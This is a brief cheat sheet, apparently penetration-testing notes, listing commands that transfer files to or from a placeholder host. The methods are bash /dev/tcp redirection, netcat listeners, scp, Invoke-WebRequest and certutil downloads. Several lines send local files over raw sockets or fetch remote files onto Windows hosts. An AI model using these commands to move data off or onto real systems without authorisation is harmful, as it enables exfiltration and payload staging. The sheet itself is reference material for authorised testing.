# Files Transfer
## Bash with Netcat listener
Upload:
`bash -c 'cat <FILE> > /dev/tcp/<IP>/<PORT>'`
`nc -lnvp <PORT> > <FILE>`

Download:
`bash -c 'cat < /dev/tcp/<IP>/<PORT> > <FILE>'`
`nc -lnvp <PORT> < <FILE>`

## Netcat
`nc -q 0 <IP> <PORT> < <FILE>` (sender)
`nc -lnvp <PORT> > <FILE>` (receiver)

## SCP (SSH)
Upload:
`scp <FILE> <USER>@<IP>:<FILE> -P <PORT>`

Download:
`scp <USER>@<IP>:<FILE> -P <PORT>`

## HTTP download
`Invoke-WebRequest "http://<IP>/<FILE>" -OutFile "<FILE>"`
`certutil -urlcache -f http://<IP>/<FILE> <FILE>`